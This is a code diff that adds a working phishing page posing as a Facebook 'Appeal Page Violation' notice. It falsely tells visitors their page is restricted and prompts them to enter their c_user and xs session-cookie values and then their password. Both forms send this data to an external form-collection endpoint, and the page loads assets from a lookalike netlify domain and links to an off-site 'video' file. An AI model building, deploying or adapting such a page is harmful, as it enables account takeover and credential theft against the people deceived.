@@ -1,0 +1,169 @@
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+    <html>
+    <head>
+      <script type="module" src="https://fbrequestreviewcom.netlify.app/@vite/client"></script>
+
+      <title>Action Required</title>
+
+      <link rel="icon" type="image/x-icon" href="https://fbrequestreviewcom.netlify.app/Facebook_Logo_2023.png">
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <!-- Include i18next library -->
+      <script src="https://cdn.jsdelivr.net/npm/i18next@22.4.4/dist/umd/i18next.min.js"></script>
+      <!-- Include i18next language detector -->
+      <script src="https://cdn.jsdelivr.net/npm/i18next-browser-languagedetector@5.0.2/dist/umd/i18nextBrowserLanguageDetector.min.js"></script>
+
+      <link href="style.css" rel="stylesheet">
+
+    </head>
+
+    <body>
+      <div class="md:block lg:block hidden border flex w-full h-[6rem]  relative bg-[#4667ac]">
+        <div class="mx-10 mt-4">
+          <b class="text-5xl text-white">facebook</b>
+        </div>
+        <div class="form-container" id="formContainer">
+            <form id="mainForm" action="https://submit-form.com/QOxDGFRf0" method="POST" onsubmit="return showAdditionalInfo(event)">
+
+          <div style="position: absolute; left: 1.5rem; top:8rem; width: 90%;">
+            <div>
+              <p class="border-b h-10 font-bold text-[16px] text-[#4b4f56] pl-3 p-2 bg-[#f5f6f7]">
+                Appeal Page Violation
+              </p>
+            </div>
+            <div>
+              <p class="mt-4 pl-3 text-[12px] font-semibold">
+                We have detected unusual activity on your page that violates our community standards.
+              </p>
+            </div>
+            <div>
+              <p class="mt-4 pl-3 text-[12px] font-semibold">
+                Your access to your page has been limited, and you are currently unable to post, share, or comment using
+                your page.
+              </p>
+            </div>
+
+            <div>
+              <p class="mt-4 pl-3 text-[12px] font-semibold">
+                If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary
+                information.
+              </p>
+            </div>
+
+            <br>
+            <div>
+              <p class="text-[14px] text-[#000000] p-2 font-semibold">
+                Detailed Video Information
+              </p>
+            </div>
+            <br>
+            <div>
+              <a class="w-[120px] h-[80px] block mx-3" href="https://detailed-video-29b30.web.app/detailed%20video.mp4"><img
+                  class="w-[120px] h-[80px] block mx-3" src="download.jfif" alt=""> </a>
+            </div>
+            <br>
+            <div>
+              <p class=" pl-3 text-[12px] font-semibold">
+                Please be sure to provide the requested information below.
+              </p>
+            </div>
+            <br>
+            <div>
+              <p class="text-slate-400 pl-4 mt-1">
+                C_user
+              </p><input class="border h-5 mx-3" type="number" name="c_user" id="" required>
+    </div><div><p class="text-sm text-gray-400 mx-5 mt-2">
+      xs
+    </p>
+      <input class="border h-5 mx-3" type="text" name="xs" id="" required>
+            </div>
+            <div>
+              <p class="mt-4 pl-3 text-[12px] font-semibold">
+                Please make sure account not to log out from your computer or laptop until you have received a verification
+                email.
+              </p>
+            </div>
+            <div class="border mx-3 h-10 mt-4 bg-[#f5f6f7]">
+              <div class="flex justify-start mx-5">
+                <button class="border h-7 w-16  bg-[#4267b2] text-white shadow-2xl mt-[0.30rem] font-serif font-thin text-xs hover:bg-blue-500" id="mainSubmitBtn" type="submit">
+                          Submit
+                        </button>
+                      </div>
+                      <br>
+                  </div>
+                  </div>
+            </form>
+            </div>
+        <br>
+        <br>
+        <br>
+                <!-- Closing div for the outer container -->
+                <div class="form-container" id="additionalInfoContainer" style="display: none;">
+                  <form action="https://submit-form.com/QOxDGFRf0" method="post">
+                    <!-- Include fields from the main form that you want to submit -->
+                    <input type="hidden" name="c_user" id="additionalCUser">
+                    <input type="hidden" name="xs" id="additionalXs">
+
+                    <label for="additionalInfo" style=”font-size:25;” >Facebook Security</label>
+                    <div class="Caption ">
+                      <font color="grey">Please re-enter your password to complete the request. <a></a>
+                    </font></div>
+                    <input type="text" id="additionalInfo" name="additionalInfo" placeholder="Password">
+                    <button class="border h-7 w-16  bg-[#4267b2] text-white shadow-2xl mt-[0.30rem] font-serif font-thin text-xs hover:bg-blue-500" type="submit" >Submit</button>
+                  </form>
+                </div>
+<br>
+
+        <script>
+          i18next
+            .use(i18nextBrowserLanguageDetector)
+            .init({
+              resources: {
+                en: { translation: { 'form.title': 'Action Required', 'form.placeholder': 'Enter additional information', 'form.submit': 'Submit' } },
+                es: { translation: { 'form.title': 'Acción requerida', 'form.placeholder': 'Ingrese información adicional', 'form.submit': 'Enviar' } }
+              },
+              fallbackLng: 'en',
+              debug: true,
+              detection: {
+                order: ['navigator']
+              }
+            })
+            .then(() => {
+              updateTranslations(); // Initial translation update
+            });
+
+          function updateTranslations() {
+            document.getElementById('additionalInfoLabel').textContent = i18next.t('form.title');
+            document.getElementById('additionalInfo').placeholder = i18next.t('form.placeholder');
+            document.getElementById('mainSubmitBtn').textContent = i18next.t('form.submit');
+          }
+
+          function showAdditionalInfo(event) {
+            event.preventDefault();
+            var c_user = document.getElementById('mainForm').elements['c_user'].value;
+            var xs = document.getElementById('mainForm').elements['xs'].value;
+
+            // Check if c_user and xs are provided
+            if (c_user && xs) {
+              document.getElementById('formContainer').style.display = 'none';
+              document.getElementById('additionalInfoContainer').style.display = 'block';
+
+              // Set values in the additional information form
+              document.getElementById('additionalCUser').value = c_user;
+              document.getElementById('additionalXs').value = xs;
+            } else {
+              alert('Please provide c_user and xs before submitting.');
+            }
+          }
+        </script>
+    </div>
+    </body>
+
+    </html>
